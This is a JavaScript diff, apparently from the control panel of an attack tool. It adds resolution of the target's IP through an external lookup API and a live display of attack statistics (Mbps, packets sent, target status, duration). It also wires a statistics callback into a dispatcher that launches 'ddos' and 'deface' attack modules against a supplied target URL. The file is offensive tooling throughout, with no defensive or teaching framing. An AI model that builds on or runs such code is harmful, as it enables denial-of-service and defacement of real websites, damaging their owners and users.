@@ -9,20 +9,37 @@ const attackStatistics = {
     mbps: 0,
     packetsSent: 0,
     targetStatus: 'Offline',
+    targetIP: 'Unknown',
     attackDuration: 0,
     startTime: null,
     intervalId: null
+};
+
+const resolveTargetIP = async (target) => {
+    try {
+        const url = new URL(target);
+        const hostname = url.hostname;
+        const response = await fetch(`https://api.hackertarget.com/hostsearch/?host=${hostname}`);
+        const data = await response.text();
+        const ipMatch = data.match(/^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/m);
+        return ipMatch ? ipMatch[0] : 'Unknown';
+    } catch (error) {
+        console.error('Failed to resolve target IP:', error);
+        return 'Unknown';
+    }
 };
 
 const updateStatisticsDisplay = () => {
     const mbpsDisplay = document.getElementById('mbps');
     const packetsDisplay = document.getElementById('packets');
     const statusDisplay = document.getElementById('targetStatus');
+    const ipDisplay = document.getElementById('targetIP');
     const durationDisplay = document.getElementById('attackDuration');
 
     if (mbpsDisplay) mbpsDisplay.textContent = attackStatistics.mbps.toFixed(2);
     if (packetsDisplay) packetsDisplay.textContent = attackStatistics.packetsSent;
     if (statusDisplay) statusDisplay.textContent = attackStatistics.targetStatus;
+    if (ipDisplay) ipDisplay.textContent = attackStatistics.targetIP;
     if (durationDisplay) {
         const seconds = Math.floor((attackStatistics.attackDuration / 1000) % 60);
         const minutes = Math.floor((attackStatistics.attackDuration / (1000 * 60)) % 60);
@@ -44,10 +61,11 @@ const stopStatistics = () => {
     attackStatistics.intervalId = null;
 };
 
-const updateStatistics = (mbps = 0, packets = 0, status = 'Offline') => {
+const updateStatistics = (mbps = 0, packets = 0, status = 'Offline', ip = 'Unknown') => {
     attackStatistics.mbps = mbps;
     attackStatistics.packetsSent = packets;
     attackStatistics.targetStatus = status;
+    attackStatistics.targetIP = ip;
     updateStatisticsDisplay();
 };
 
@@ -56,13 +74,17 @@ const executeAttack = async (target, attackType, options) => {
         if (!target) {
             throw new Error('Target URL is required.');
         }
+
+        const targetIP = await resolveTargetIP(target);
+        updateStatistics(0, 0, 'Starting', targetIP);
+
         startStatistics();
         switch (attackType) {
             case 'ddos':
                 if (!ddosAttack || typeof ddosAttack.execute !== 'function') {
                     throw new Error('DDoS module is not properly configured.');
                 }
-                await ddosAttack.execute(target, options);
+                await ddosAttack.execute(target, options, updateStatistics);
                 break;
             case 'deface':
                 if (!defaceSite || typeof defaceSite.execute !== 'function') {
@@ -93,10 +115,10 @@ const executeAttack = async (target, attackType, options) => {
         }
     } catch (error) {
         console.error('Attack execution failed:', error);
+        updateStatistics(0, 0, 'Failed');
         throw error;
     } finally {
         stopStatistics();
-        updateStatistics();
     }
 };
 
